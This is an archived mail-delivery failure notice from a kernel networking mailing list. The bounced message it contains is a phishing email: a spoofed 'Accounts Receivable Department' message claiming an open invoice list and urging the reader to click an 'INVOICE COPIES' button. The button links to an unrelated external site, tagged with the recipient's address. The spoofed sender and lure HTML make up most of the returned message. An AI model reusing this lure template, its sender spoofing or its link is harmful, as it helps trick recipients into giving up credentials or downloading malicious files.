Return-Path: <netdev+bounces-24792-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id A35C8771B61
	for <lists+netdev@lfdr.de>; Mon,  7 Aug 2023 09:18:46 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 5DAD8280FBA
	for <lists+netdev@lfdr.de>; Mon,  7 Aug 2023 07:18:45 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 34BE83FFA;
	Mon,  7 Aug 2023 07:18:43 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 28A723D9C
	for <netdev@vger.kernel.org>; Mon,  7 Aug 2023 07:18:43 +0000 (UTC)
X-Greylist: delayed 571 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Mon, 07 Aug 2023 00:18:41 PDT
Received: from affectionate-fermi.94-131-99-128.plesk.page (unknown [94.131.99.128])
	by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 6CC2E10F0
	for <netdev@vger.kernel.org>; Mon,  7 Aug 2023 00:18:41 -0700 (PDT)
Received: by affectionate-fermi.94-131-99-128.plesk.page (Postfix)
	id 911441E30A07; Mon,  7 Aug 2023 09:09:01 +0200 (CEST)
Date: Mon,  7 Aug 2023 09:09:01 +0200 (CEST)
From: MAILER-DAEMON@affectionate-fermi.94-131-99-128.plesk.page (Mail Delivery System)
Subject: Undelivered Mail Returned to Sender
To: netdev@vger.kernel.org
Auto-Submitted: auto-replied
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status;
	boundary="EDC051E30CD1.1691392141/affectionate-fermi.94-131-99-128.plesk.page"
Message-Id: <20230807070901.911441E30A07@affectionate-fermi.94-131-99-128.plesk.page>
X-Spam-Status: No, score=1.8 required=5.0 tests=BAYES_50,
	HTML_FONT_LOW_CONTRAST,HTML_MESSAGE,MAY_BE_FORGED,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_NONE autolearn=no autolearn_force=no
	version=3.4.6
X-Spam-Level: *
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

This is a MIME-encapsulated message.

--EDC051E30CD1.1691392141/affectionate-fermi.94-131-99-128.plesk.page
Content-Description: Notification
Content-Type: text/plain; charset=us-ascii

This is the mail system at host affectionate-fermi.94-131-99-128.plesk.page.

I'm sorry to have to inform you that your message could not
be delivered to one or more recipients. It's attached below.

For further assistance, please send mail to postmaster.

If you do so, please include this problem report. You can
delete your own text from the attached returned message.

                   The mail system

<netdev@vger.kernel.org>: host vger.kernel.org[23.128.96.18] said: 550 5.7.1
    Spamassassin considers this message SPAM. In case you disagree, send the
    ENTIRE message (preferably as a saved attachment) plus this error message
    to <postmaster@vger.kernel.org>  (in reply to end of DATA command)

--EDC051E30CD1.1691392141/affectionate-fermi.94-131-99-128.plesk.page
Content-Description: Delivery report
Content-Type: message/delivery-status

Reporting-MTA: dns; affectionate-fermi.94-131-99-128.plesk.page
X-Postfix-Queue-ID: EDC051E30CD1
X-Postfix-Sender: rfc822; netdev@vger.kernel.org
Arrival-Date: Mon,  7 Aug 2023 09:01:02 +0200 (CEST)

Final-Recipient: rfc822; netdev@vger.kernel.org
Original-Recipient: rfc822;netdev@vger.kernel.org
Action: failed
Status: 5.7.1
Remote-MTA: dns; vger.kernel.org
Diagnostic-Code: smtp; 550 5.7.1 Spamassassin considers this message SPAM. In
    case you disagree, send the ENTIRE message (preferably as a saved
    attachment) plus this error message to <postmaster@vger.kernel.org>

--EDC051E30CD1.1691392141/affectionate-fermi.94-131-99-128.plesk.page
Content-Description: Undelivered Message
Content-Type: message/rfc822

Return-Path: <netdev@vger.kernel.org>
Received: from remondis.de (unknown [37.120.222.183])
	by affectionate-fermi.94-131-99-128.plesk.page (Postfix) with ESMTPSA id EDC051E30CD1
	for <netdev@vger.kernel.org>; Mon,  7 Aug 2023 09:01:02 +0200 (CEST)
Authentication-Results: affectionate-fermi.94-131-99-128.plesk.page;
	spf=pass (sender IP is 37.120.222.183) smtp.mailfrom=netdev@vger.kernel.org smtp.helo=remondis.de
Received-SPF: pass (affectionate-fermi.94-131-99-128.plesk.page: connection is authenticated)
From: Accounts Receivable Department <netdev@vger.kernel.org>
To: netdev@vger.kernel.org
Subject: Open Invoice List
Date: 07 Aug 2023 00:01:03 -0700
Message-ID: <20230807000101.FB7B819FE62A7C2D@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.21068"></HEAD>
<body>
<DIV role=3Dregion class=3Drightcol aria-labelledby=3Daria-label-messagebod=
y>
<DIV id=3Dmessagebody>
<DIV id=3Dmessage-htmlpart1 class=3Dmessage-htmlpart><!-- html ignored --><=
!-- head ignored --><!-- meta ignored -->
<DIV class=3DrcmBody>
<P><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: 'Segoe UI'; COLOR: #3f3f3f"=
><BR><SPAN style=3D"COLOR: #595959"><BR><SPAN style=3D"FONT-SIZE: 14px; FON=
T-FAMILY: 'Segoe UI'; COLOR: #595959">Attn:&nbsp; Accounts Payable,</SPAN><=
STRONG style=3D"FONT-SIZE: 14px; FONT-FAMILY: 'Segoe UI'; COLOR: #595959">&=
nbsp;</STRONG><BR><BR><SPAN style=3D"COLOR: #595959"><STRONG><SPAN style=3D=
"COLOR: #31859b">Attached is a list of open/unpaid invoices as of today's d=
ate.</SPAN>&nbsp;&nbsp;&nbsp;</STRONG></SPAN><BR>
<BR><SPAN style=3D"FONT-FAMILY: Tahoma; COLOR: #e36c09"><STRONG><SPAN style=
=3D"COLOR: #31859b">Missing an invoice?&nbsp;</SPAN><SPAN style=3D"COLOR: #=
31859b"> &nbsp;Click the INVOICE COPIES button to download a copy and revie=
w.&nbsp;<STRONG style=3D"FONT-SIZE: 14px; FONT-FAMILY: Tahoma; COLOR: #e36c=
09"><STRONG><SPAN style=3D"FONT-SIZE: 16px; COLOR: #31859b; text-decoration=
-line: underline"></SPAN></STRONG></STRONG></SPAN></STRONG></SPAN></SPAN></=
SPAN></P>
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%">
<TBODY>
<TR>
<td>
<table cellspacing=3D"0" cellpadding=3D"0">
<TBODY>
<TR>
<td style=3D"border-radius: 2px" bgcolor=3D"#1fb6c1">
<A style=3D"FONT-SIZE: 14px; TEXT-DECORATION: none; BORDER-TOP: #1fb6c1 1px=
 solid; FONT-FAMILY: Helvetica, Arial, sans-serif; BORDER-RIGHT: #1fb6c1 1p=
x solid; BORDER-BOTTOM: #1fb6c1 1px solid; FONT-WEIGHT: bold; COLOR: #fffff=
f; PADDING-BOTTOM: 8px; PADDING-TOP: 8px; PADDING-LEFT: 12px; BORDER-LEFT: =
#1fb6c1 1px solid; DISPLAY: inline-block; PADDING-RIGHT: 12px; border-radiu=
s: 2px" href=3D"https://versesallyall.com/ligr/customer/index.php/guest/#ne=
tdev@vger.kernel.org" rel=3Dnoreferrer target=3D_blank>
INVOICE COPIES </A></TD></TR>
<TR></TR></TBODY></TABLE></TD></TR>
<TR></TR></TBODY></TABLE>&nbsp;<SPAN style=3D"COLOR: #595959"><BR>Accounts =
Receivable Dept.</SPAN></DIV></DIV></DIV></DIV></BODY></HTML>

--EDC051E30CD1.1691392141/affectionate-fermi.94-131-99-128.plesk.page--

